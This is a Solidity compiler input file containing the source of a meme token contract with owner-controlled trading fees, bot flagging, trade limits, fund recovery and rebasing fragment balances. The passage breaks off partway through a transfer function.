{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "contracts/Inversebrah.sol": {
      "content": "// SPDX-License-Identifier: MIT\n\n/*\n\nWe are wassies!!! Wassies are gonna make it\n\n@wassie \n\n*/\n\n\n\n\n// OpenZeppelin Contracts v4.3.2 (utils/Context.sol)\n\n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\n// OpenZeppelin Contracts v4.3.2 (access/Ownable.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Contract module which provides a basic access control mechanism, where\n * there is an account (an owner) that can be granted exclusive access to\n * specific functions.\n *\n * By default, the owner account will be the one that deploys the contract. This\n * can later be changed with {transferOwnership}.\n *\n * This module is used through inheritance. It will make available the modifier\n * `onlyOwner`, which can be applied to your functions to restrict their use to\n * the owner.\n */\nabstract contract Ownable is Context {\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor() {\n        _transferOwnership(_msgSender());\n    }\n\n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner() {\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby removing any functionality that is only available to the owner.\n     */\n    function renounceOwnership() public virtual onlyOwner {\n        _transferOwnership(address(0));\n    }\n\n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        _transferOwnership(newOwner);\n    }\n\n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Internal function without access restriction.\n     */\n    function _transferOwnership(address newOwner) internal virtual {\n        address oldOwner = _owner;\n        _owner = newOwner;\n        emit OwnershipTransferred(oldOwner, newOwner);\n    }\n}\n\ncontract Killable is Ownable {\n\n    mapping(uint => uint256) internal _killedFunctions;\n\n    modifier activeFunction(uint selector) {\n        require(_killedFunctions[selector] > block.timestamp || _killedFunctions[selector] == 0, \"deactivated\");\n        _;\n    }\n\n    function permanentlyDeactivateFunction(uint selector, uint256 timeLimit)\n        external\n        onlyOwner\n    {\n        _killedFunctions[selector] = timeLimit + block.timestamp;\n    }\n}\n\nabstract contract Structure is Ownable {\n    enum TransactionState {Buy, Sell, Normal}\n    enum TransactionType { FromExcluded, ToExcluded, BothExcluded, Standard }\n\n    struct TState {\n        address target;\n        TransactionState state;\n    }\n\n}\n\n\nabstract contract SwapHelper is Ownable, Killable {\n\n    IUniswapV2Router02 internal _router;\n    IUniswapV2Pair     internal _lp;\n\n    address internal _token0;\n    address internal _token1;\n\n    bool internal _isRecursing;\n    bool internal _swapEnabled;\n\n    receive() external payable {}\n    \n    constructor(address router) {\n        _router = IUniswapV2Router02(router);\n    }\n\n    function _swapTokensForTokens(address token0, address token1, uint256 tokenAmount, address rec) internal {\n        address[] memory path = new address[](2);\n        path[0] = token0;\n        path[1] = token1;\n        IERC20(token0).approve(address(_router), tokenAmount);\n        _router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            tokenAmount,\n            0, // we don't care how much we get back\n            path,\n            rec, // can't set to same as token\n            block.timestamp\n        );\n    }\n\n    function _swapTokensForEth(address tokenAddress, address rec, uint256 tokenAmount) internal\n    {\n        address[] memory path = new address[](2);\n        path[0] = tokenAddress;\n        path[1] = _router.WETH();\n\n        IERC20(tokenAddress).approve(address(_router), tokenAmount);\n\n        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n            tokenAmount,\n            0, // accept any amount of ETH\n            path,\n            rec, // The contract\n            block.timestamp\n        );\n    }\n\n    function setRouter(address router)\n        external\n        onlyOwner\n    {\n        _router = IUniswapV2Router02(router);\n    }\n\n    function setTokens(address t0, address t1)\n        external\n        onlyOwner\n    {\n        _token0 = t0;\n        _token1 = t1;\n    }\n\n    function _initializeSwapHelper(address token0, address token1) internal {\n        _lp = IUniswapV2Pair(IUniswapV2Factory(_router.factory()).createPair(token0, token1));\n    } \n\n    function _performLiquify(uint256 amount) virtual internal {\n        if (_swapEnabled && !_isRecursing) {\n            _isRecursing = true;\n            amount = amount;\n            _isRecursing = false;\n        }\n    }\n\n    function setTransferPair(address p)\n        external\n        onlyOwner\n    {\n        _lp = IUniswapV2Pair(p);\n    }\n\n    function setSwapEnabled(bool v)\n        external\n        onlyOwner\n    {\n        _swapEnabled = v;\n    }\n\n}\n\nabstract contract TradeValidator is Ownable, Killable {\n\n    bool internal _isCheckingMaxTxn;\n    bool internal _isCheckingCooldown;\n    bool internal _isCheckingWalletLimit;\n    bool internal _isCheckingForSpam;\n    bool internal _isCheckingForBot;\n    bool internal _isCheckingBuys;\n\n    uint256 internal _maxTxnAmount;\n    uint256 internal _walletSizeLimitInPercent;\n    uint256 internal _cooldownInSeconds;\n\n    mapping(address => uint256) _lastBuys;\n    mapping(address => uint256) _lastCoolDownTrade;\n    mapping(address => bool)    _possibleBot;\n\n    function _checkIfBot(address account) internal view {\n        require(_possibleBot[account] != true, \"possible bot\");\n    }\n\n    function _checkMaxTxn(uint256 amount) internal view {\n        require(amount <= _maxTxnAmount, \"over max\");\n    }\n\n    function _checkCooldown(address recipient) internal {\n        require(block.timestamp >= _lastBuys[recipient] + _cooldownInSeconds, \"buy cooldown\");\n        _lastBuys[recipient] = block.timestamp;\n    }\n\n    function _checkWalletLimit(uint256 recipientBalance, uint256 supplyTotal, uint256 amount) internal view {\n        require(recipientBalance + amount <= (supplyTotal * _walletSizeLimitInPercent) / 100, \"over limit\");\n    }\n\n    function _checkForSpam(address pair, address to, address from) internal {\n        bool disallow;\n        // Disallow multiple same source trades in same block\n        if (from == pair) {\n            disallow = _lastCoolDownTrade[to] == block.number || _lastCoolDownTrade[tx.origin] == block.number;\n            _lastCoolDownTrade[to] = block.number;\n            _lastCoolDownTrade[tx.origin] = block.number;\n        } else if (to == pair) {\n            disallow = _lastCoolDownTrade[from] == block.number || _lastCoolDownTrade[tx.origin] == block.number;\n            _lastCoolDownTrade[from] = block.number;\n            _lastCoolDownTrade[tx.origin] = block.number;\n        }\n        require(!disallow, \"Multiple trades in same block from same source are not allowed during trading start cooldown\");\n    }\n\n    function setCheck(uint8 option, bool trueOrFalse)\n        external\n        onlyOwner\n        activeFunction(30)\n    {\n        if(option == 0) {\n            _isCheckingMaxTxn = trueOrFalse;\n        }\n        if(option == 1) {\n            _isCheckingCooldown = trueOrFalse;\n        }\n        if(option == 2) {\n            _isCheckingForSpam = trueOrFalse;\n        }\n        if(option == 3) {\n            _isCheckingWalletLimit = trueOrFalse;\n        }\n        if(option == 4) {\n            _isCheckingForBot = trueOrFalse;\n        }\n        if(option == 5) {\n            _isCheckingBuys = trueOrFalse;\n        }\n    }\n\n    function setTradeCheckValues(uint8 option, uint256 value)\n        external\n        onlyOwner\n        activeFunction(31)\n    {\n        if(option == 0) {\n            _maxTxnAmount = value;\n        }\n        if(option == 1) {\n            _walletSizeLimitInPercent = value;\n        }\n        if(option == 2) {\n            _cooldownInSeconds = value;\n        }\n    }\n\n    function setPossibleBot(address account, bool trueOrFalse)\n        external\n        onlyOwner\n        activeFunction(32)\n    {\n        _possibleBot[account] = trueOrFalse;\n    }\n}\n\n\nabstract contract TransactionStructure is Structure {\n\n    /*\n    * @dev update the transferPair value when we're dealing with other pools \n    */\n    struct AccountState {\n        bool feeless;\n        bool transferPair; \n        bool excluded;\n    }\n\n    mapping(address => AccountState) internal _accountStates;\n\n    function fbl_getIsFeeless(address from, address to) public view returns(bool) {\n        return _accountStates[from].feeless || _accountStates[to].feeless;\n    }\n\n    function fbl_getTxType(address from, address to) public view returns(TransactionType) {\n        bool isSenderExcluded = _accountStates[from].excluded;\n        bool isRecipientExcluded = _accountStates[to].excluded;\n        if (!isSenderExcluded && !isRecipientExcluded) {\n            return TransactionType.Standard;\n        } else if (isSenderExcluded && !isRecipientExcluded) {\n            return TransactionType.FromExcluded;\n        } else if (!isSenderExcluded && isRecipientExcluded) {\n            return TransactionType.ToExcluded;\n        } else if (isSenderExcluded && isRecipientExcluded) {\n            return TransactionType.BothExcluded;\n        } else {\n            return TransactionType.Standard;\n        }\n    }\n\n    function fbl_getTstate(address from, address to) public view returns(TransactionState) {\n        if(_accountStates[from].transferPair == true) {\n            return TransactionState.Buy;\n        } else if(_accountStates[to].transferPair == true) {\n            return TransactionState.Sell;\n        } else {\n            return TransactionState.Normal;\n        }\n    }\n\n    function fbl_getExcluded(address account) public view returns(bool) {\n        return _accountStates[account].excluded;\n    }\n    \n    function fbl_getAccountState(address account) public view returns(AccountState memory) {\n        return _accountStates[account];\n    }\n\n    function fbl_setAccountState(address account, bool value, uint option) external\n        onlyOwner\n    {\n        if(option == 1) {\n            _accountStates[account].feeless = value;\n        } else if(option == 2) {\n            _accountStates[account].transferPair = value;\n        } else if(option == 3) {\n            _accountStates[account].excluded = value;\n        }\n    }\n}\n\nabstract contract FeeStructure is Structure, Killable {\n\n    event FeeAdded(TransactionState state, uint perc, string name);\n    event FeeUpdated(TransactionState state, uint perc, uint index);\n    event FeeRemoved(TransactionState state, uint index);\n    \n    uint internal _precisionFactor = 2; // how much to multiply the denominator by \n\n    mapping(TransactionState => uint[]) fees;\n\n    mapping(TransactionState => uint) activeFeeCount;\n\n    mapping(TransactionState => uint) totalFee;\n    \n    function fbl_calculateFeeSpecific(TransactionState state, uint index, uint256 amount) public view returns(uint256) {\n        return amount * fees[state][index] / fbl_getFeeFactor();\n    }\n\n    function fbl_calculateStateFee(TransactionState state, uint256 amount) public view returns (uint256) {\n        uint256 feeTotal;\n        if(state == TransactionState.Buy) {\n            feeTotal = (amount * fbl_getTotalFeesForBuyTxn()) / fbl_getFeeFactor();\n        } else if (state == TransactionState.Sell) {\n            feeTotal = (amount * fbl_getTotalFeesForSellTxn()) / fbl_getFeeFactor();\n        } else {\n            feeTotal = (amount * fbl_getTotalFee(TransactionState.Normal)) / fbl_getFeeFactor(); \n        }\n        return feeTotal;\n    }\n    \n    function _checkUnderLimit() internal view returns(bool) {\n        // we check here all the fees to ensure that we don't have a scenario where one set of fees exceeds 33% \n        require(fbl_calculateStateFee(TransactionState.Sell, 100000)   <= 33333, \"ERC20Feeable: Sell Hardcap of 33% reached\");\n        require(fbl_calculateStateFee(TransactionState.Buy, 100000)    <= 33333, \"ERC20Feeable: Buy  Hardcap of 33% reached\");\n        require(fbl_calculateStateFee(TransactionState.Normal, 100000) <= 33333, \"ERC20Feeable: Norm Hardcap of 33% reached\");\n        return true;\n    }\n    \n    function fbl_getFee(TransactionState state, uint index) public view returns(uint) {\n        return fees[state][index];\n    }\n    \n    function fbl_getTotalFeesForBuyTxn() public view returns(uint) {\n        return totalFee[TransactionState.Normal] + totalFee[TransactionState.Buy];\n    }\n    \n    function fbl_getTotalFeesForSellTxn() public view returns(uint) {\n        return totalFee[TransactionState.Normal] + totalFee[TransactionState.Sell];\n    }\n    \n    function fbl_getTotalFee(TransactionState state) public view returns(uint) {\n        return totalFee[state];\n    }\n    \n    /* @dev when you increase this that means all fees are reduced by whatever this factor is. \n    *  eg. 2% fee, 1 dF = 2% fee \n    *  vs  2% fee  2 dF = 0.2% fee \n    *  TLDR; increase this when you want more precision for decimals \n    */\n    function fbl_getFeeFactor() public view returns(uint) {\n        return 10 ** _precisionFactor;\n    }\n\n    // can be changed to external if you don't need to add fees during initialization of a contract \n    function fbl_feeAdd(TransactionState state, uint perc, string memory label) public\n        onlyOwner\n        activeFunction(20)\n    {\n        fees[state].push(perc);\n        totalFee[state] += perc;\n        activeFeeCount[state] ++;\n        _checkUnderLimit();\n        emit FeeAdded(state, perc, label);\n    }\n\n    function fbl_feeUpdate(TransactionState state, uint perc, uint index) external\n        onlyOwner\n        activeFunction(21)\n    {\n        fees[state][index] = perc;\n        uint256 total;\n        for (uint i = 0; i < fees[state].length; i++) {\n            total += fees[state][i];\n        } \n        totalFee[state] = total;\n        _checkUnderLimit();\n        emit FeeUpdated(state, perc, index);\n    }\n\n    /* update fees where possible vs remove */\n    function fbl_feeRemove(TransactionState state, uint index) external\n        onlyOwner\n        activeFunction(22)\n    {\n        uint f = fees[state][index];\n        totalFee[state] -= f;\n        delete fees[state][index];\n        activeFeeCount[state]--;\n        emit FeeRemoved(state, index);\n    }\n    \n    function fbl_feePrecisionUpdate(uint f) external\n        onlyOwner\n        activeFunction(23)\n\n    {\n        require(f != 0, \"can't divide by 0\");\n        _precisionFactor = f;\n        _checkUnderLimit();\n    }\n\n}\n\n\n/**\n * @dev Contract module which allows for tokens to be recovered\n */\nabstract contract Recoverable is Context, Ownable {\n\n    using SafeERC20 for IERC20;\n\n    function recoverTokens(IERC20 token) public\n        onlyOwner()\n    {\n        token.safeTransfer(_msgSender(), token.balanceOf(address(this)));\n    }\n\n    function recoverEth(address rec) public\n        onlyOwner()\n    {\n        payable(rec).transfer(address(this).balance);\n    }\n}\n\n\n// OpenZeppelin Contracts v4.3.2 (token/ERC20/IERC20.sol)\n\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n\n/**\n * @dev Interface for the optional metadata functions from the ERC20 standard.\n *\n * _Available since v4.1._\n */\ninterface IERC20Metadata is IERC20 {\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() external view returns (string memory);\n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol() external view returns (string memory);\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals() external view returns (uint8);\n}\n\n\n/**\n * @dev Implementation of the {IERC20} interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {_mint}.\n * For a generic mechanism see {ERC20PresetMinterPauser}.\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC20\n * applications.\n *\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\n * This allows applications to reconstruct the allowance for all accounts just\n * by listening to said events. Other implementations of the EIP may not emit\n * these events, as it isn't required by the specification.\n *\n * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\n * functions have been added to mitigate the well-known issues around setting\n * allowances. See {IERC20-approve}.\n */\ncontract ERC20 is Context, IERC20, IERC20Metadata {\n    \n    mapping(address => uint256) internal _balances;\n    mapping(address => mapping(address => uint256)) internal _allowances;\n    uint256 internal _totalSupply;\n    string  internal _name;\n    string  internal _symbol;\n    uint8   internal _decimals;\n\n    /**\n     * @dev Sets the values for {name} and {symbol}.\n     *\n     * The default value of {decimals} is 18. To select a different value for\n     * {decimals} you should overload it.\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 tokens) {\n        _name = name_;\n        _symbol = symbol_;\n        _decimals = decimals_;\n        _totalSupply = tokens;\n    }\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the value {ERC20} uses, unless this function is\n     * overridden;\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * {IERC20-balanceOf} and {IERC20-transfer}.\n     */\n    function decimals() public view virtual override returns (uint8) {\n        return _decimals;\n    }\n\n    /**\n     * @dev See {IERC20-totalSupply}.\n     */\n    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n    /**\n     * @dev See {IERC20-balanceOf}.\n     */\n    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n    /**\n     * @dev See {IERC20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `recipient` cannot be the zero address.\n     * - the caller must have a balance of at least `amount`.\n     */\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-allowance}.\n     */\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    /**\n     * @dev See {IERC20-approve}.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-transferFrom}.\n     *\n     * Emits an {Approval} event indicating the updated allowance. This is not\n     * required by the EIP. See the note at the beginning of {ERC20}.\n     *\n     * Requirements:\n     *\n     * - `sender` and `recipient` cannot be the zero address.\n     * - `sender` must have a balance of at least `amount`.\n     * - the caller must have allowance for ``sender``'s tokens of at least\n     * `amount`.\n     */\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n        unchecked {\n            _approve(sender, _msgSender(), currentAllowance - amount);\n        }\n\n        return true;\n    }\n\n    /**\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {IERC20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\n        return true;\n    }\n\n    /**\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {IERC20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     * - `spender` must have allowance for the caller of at least\n     * `subtractedValue`.\n     */\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\n        unchecked {\n            _approve(_msgSender(), spender, currentAllowance - subtractedValue);\n        }\n\n        return true;\n    }\n\n    /**\n     * @dev Moves `amount` of tokens from `sender` to `recipient`.\n     *\n     * This internal function is equivalent to {transfer}, and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {Transfer} event.\n     *\n     * Requirements:\n     *\n     * - `sender` cannot be the zero address.\n     * - `recipient` cannot be the zero address.\n     * - `sender` must have a balance of at least `amount`.\n     */\n    function _transfer(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) internal virtual {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n        _beforeTokenTransfer(sender, recipient, amount);\n\n        uint256 senderBalance = _balances[sender];\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n        unchecked {\n            _balances[sender] = senderBalance - amount;\n        }\n        _balances[recipient] += amount;\n\n        emit Transfer(sender, recipient, amount);\n\n        _afterTokenTransfer(sender, recipient, amount);\n    }\n\n    /** @dev Creates `amount` tokens and assigns them to `account`, increasing\n     * the total supply.\n     *\n     * Emits a {Transfer} event with `from` set to the zero address.\n     *\n     * Requirements:\n     *\n     * - `account` cannot be the zero address.\n     */\n    function _mint(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: mint to the zero address\");\n\n        _beforeTokenTransfer(address(0), account, amount);\n\n        _totalSupply += amount;\n        _balances[account] += amount;\n        emit Transfer(address(0), account, amount);\n\n        _afterTokenTransfer(address(0), account, amount);\n    }\n\n    /**\n     * @dev Destroys `amount` tokens from `account`, reducing the\n     * total supply.\n     *\n     * Emits a {Transfer} event with `to` set to the zero address.\n     *\n     * Requirements:\n     *\n     * - `account` cannot be the zero address.\n     * - `account` must have at least `amount` tokens.\n     */\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: burn from the zero address\");\n\n        _beforeTokenTransfer(account, address(0), amount);\n\n        uint256 accountBalance = _balances[account];\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\n        unchecked {\n            _balances[account] = accountBalance - amount;\n        }\n        _totalSupply -= amount;\n\n        emit Transfer(account, address(0), amount);\n\n        _afterTokenTransfer(account, address(0), amount);\n    }\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {Approval} event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     */\n    function _approve(\n        address owner,\n        address spender,\n        uint256 amount\n    ) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    /**\n     * @dev Hook that is called before any transfer of tokens. This includes\n     * minting and burning.\n     *\n     * Calling conditions:\n     *\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n     * will be transferred to `to`.\n     * - when `from` is zero, `amount` tokens will be minted for `to`.\n     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.\n     * - `from` and `to` are never both zero.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {}\n\n    /**\n     * @dev Hook that is called after any transfer of tokens. This includes\n     * minting and burning.\n     *\n     * Calling conditions:\n     *\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n     * has been transferred to `to`.\n     * - when `from` is zero, `amount` tokens have been minted for `to`.\n     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.\n     * - `from` and `to` are never both zero.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */\n    function _afterTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {}\n}\n\nabstract contract ERC20Rebaseable is ERC20, Recoverable {\n\n    uint256 internal _totalFragments;\n    uint256 internal _frate; // fragment ratio\n    mapping(address => uint256) internal _fragmentBalances;\n\n    constructor() {\n        _totalFragments = (~uint256(0) - (~uint256(0) % totalSupply()));\n        _fragmentBalances[_msgSender()] = _totalFragments;\n    }\n    \n    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _fragmentBalances[account] / fragmentsPerToken();\n    }\n\n    function fragmentBalanceOf(address who) external virtual view returns (uint256) {\n        return _fragmentBalances[who];\n    }\n\n    function fragmentTotalSupply() external view returns (uint256) {\n        return _totalFragments;\n    }\n    \n    function fragmentsPerToken() public view virtual returns(uint256) {\n        return _totalFragments / _totalSupply;\n    }\n    \n    function _rTransfer(address sender, address recipient, uint256 amount) internal virtual returns(bool) {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n        require(amount > 0, \"can't transfer 0\");\n        _frate = fragmentsPerToken();\n        uint256 amt = amount * _frate;\n        _fragmentBalances[sender] -= amt;\n        _fragmentBalances[recipient] += amt;\n        emit Transfer(sender, recipient, amount);\n        return true;\n    }\n    \n    function transfer(address recipient, uint256 amount) public override returns (bool) {\n        _rTransfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\n        _rTransfer(sender, recipient, amount);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);\n        return true;\n    }\n\n}\n\n/*abrivd fbl*/\nabstract contract ERC20Feeable is FeeStructure, TransactionStructure, ERC20Rebaseable {\n\n    using Address for address;\n    \n    event FeesDeducted(address sender, address recipient, uint256 amount);\n\n    uint256 internal feesAccrued;\n    uint256 public totalExcludedFragments;\n    uint256 public totalExcluded;\n\n    mapping(address => uint256) internal feesAccruedByUser;\n\n    EnumerableSet.AddressSet excludedAccounts;\n\n    function exclude(address account) public \n        onlyOwner\n        activeFunction(24)\n    {\n        require(_accountStates[account].excluded == false, \"Account is already excluded\");\n        _accountStates[account].excluded = true;\n        if(_fragmentBalances[account] > 0) {\n            _balances[account] = _fragmentBalances[account] / _frate;\n            totalExcluded += _balances[account];\n            totalExcludedFragments += _fragmentBalances[account];\n        }\n        EnumerableSet.add(excludedAccounts, account);\n        _frate = fragmentsPerToken();\n    }\n\n    function include(address account) public \n        onlyOwner\n        activeFunction(25)\n    {\n        require(_accountStates[account].excluded == true, \"Account is already included\");\n        _accountStates[account].excluded = false;\n        totalExcluded -= _balances[account];\n        _balances[account] = 0;\n        totalExcludedFragments -= _fragmentBalances[account];\n        EnumerableSet.remove(excludedAccounts, account);\n        _frate = fragmentsPerToken();\n    }\n\n    function fragmentsPerToken() public view virtual override returns(uint256) {\n        uint256 netFragmentsExcluded = _totalFragments - totalExcludedFragments;\n        uint256 netExcluded = (_totalSupply - totalExcluded);\n        uint256 fpt = _totalFragments/_totalSupply;\n        if(netFragmentsExcluded < fpt) return fpt;\n        if(totalExcludedFragments > _totalFragments || totalExcluded > _totalSupply) return fpt;\n        return netFragmentsExcluded / netExcluded;\n    }\n\n    function _fragmentTransfer(address sender, address recipient, uint256 amount, uint256 transferAmount) internal {\n        TransactionType t = fbl_getTxType(sender, recipient);\n        if (t == TransactionType.ToExcluded) {\n            _fragmentBalances[sender]       -= amount * _frate;\n            totalExcluded                  += transferAmount;\n            totalExcludedFragments         += transferAmount * _frate;\n            \n            _frate = fragmentsPerToken();\n            \n            _balances[recipient]            += transferAmount;\n            _fragmentBalances[recipient]    += transferAmount * _frate;\n        } else if (t == TransactionType.FromExcluded) {\n            _balances[sender]               -= amount;\n            _fragmentBalances[sender]       -= amount * _frate;\n            \n            totalExcluded                  -= amount;\n            totalExcludedFragments         -= amount * _frate;\n            \n            _frate = fragmentsPerToken();\n\n            _fragmentBalances[recipient]    += transferAmount * _frate;\n        } else if (t == TransactionType.BothExcluded) {\n            _balances[sender]               -= amount;\n            _fragmentBalances[sender]       -= amount * _frate;\n\n            